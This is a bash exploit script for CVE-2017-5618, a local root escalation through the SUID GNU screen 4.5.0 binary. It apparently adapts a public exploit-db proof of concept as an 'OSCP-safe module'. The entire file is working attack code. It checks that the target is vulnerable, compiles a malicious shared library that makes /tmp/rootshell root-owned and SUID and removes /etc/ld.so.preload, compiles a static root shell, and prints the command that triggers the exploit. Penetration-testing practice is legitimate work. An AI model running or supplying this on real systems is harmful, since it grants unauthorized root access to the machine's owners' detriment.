#!/bin/bash

# -----------------------------------------------------------------
#  CVE-2017-5618 — SUID screen v4.5.0 local root via ld.so.preload
#  Based on @YasserREED PoC | OSCP-safe module
# -----------------------------------------------------------------

echo "Credit goes to Xiphos Research Ltd https://www.exploit-db.com/exploits/41154"

echo "[*] CVE-2017-5618 (screen v4.5.0 SUID) Module"
echo "[*] Checking prerequisites..."

# === Step 1: Locate screen binary and check SUID ===
SCREEN_PATH=$(command -v screen)
if [ -z "$SCREEN_PATH" ]; then
    echo "[-] screen not found on system"
    exit 2
fi

if ! stat -c '%A' "$SCREEN_PATH" | grep -q 's'; then
    echo "[-] screen is not SUID — skipping"
    exit 2
fi

# === Step 2: Confirm version 4.5.0 ===
VERSION=$($SCREEN_PATH --version 2>/dev/null | head -n1 | grep -Eo '4\.5\.0')
if [ "$VERSION" != "4.5.0" ]; then
    echo "[-] screen version is not 4.5.0 — skipping"
    exit 2
fi

echo "[+] screen v4.5.0 with SUID bit detected — vulnerable"

# === Step 3: Detect usable compiler ===
COMPILERS=("gcc" "gcc-11" "gcc-10" "gcc-9" "clang")
COMPILER_BIN=""

for compiler in "${COMPILERS[@]}"; do
    path=$(command -v "$compiler" 2>/dev/null)
    if [ -x "$path" ]; then
        COMPILER_BIN="$path"
        break
    fi
done

if [ -z "$COMPILER_BIN" ]; then
    echo "[-] No usable compiler found"
    exit 2
fi
echo "[+] Found compiler: $COMPILER_BIN"

# === Step 4: Create working directory and payloads ===
WORKDIR="/tmp/screen_suid"
mkdir -p "$WORKDIR"
cd "$WORKDIR" || exit 1

echo "[*] Writing libhax.c..."
cat << 'EOF' > libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF

echo "[*] Compiling libhax.so..."
$COMPILER_BIN -fPIC -shared -ldl -o libhax.so libhax.c || { echo "[-] Failed to compile libhax"; exit 1; }
rm -f libhax.c

echo "[*] Writing rootshell.c..."
cat << 'EOF' > rootshell.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main(void){
    setuid(0); setgid(0);
    seteuid(0); setegid(0);
    execl("/bin/sh", "sh", NULL);
    return 0;
}
EOF

echo "[*] Compiling rootshell..."
$COMPILER_BIN -o rootshell rootshell.c -static || { echo "[-] Failed to compile rootshell"; exit 1; }
rm -f rootshell.c

echo "[+] Payloads compiled: libhax.so and rootshell"
echo ""

# === Step 5: Instructions for manual triggering ===
echo "=============================================================="
echo "[!] Manual Step Required:"
echo ""
echo "  1. Run the following command to trigger the exploit:"
echo ""
echo "     HOME=$WORKDIR LD_PRELOAD=$WORKDIR/libhax.so $SCREEN_PATH -D -m ls"
echo ""
echo "  2. Then run: /tmp/rootshell"
echo ""
echo "=============================================================="
echo "[*] Exploit setup complete. Awaiting manual execution."
exit 0
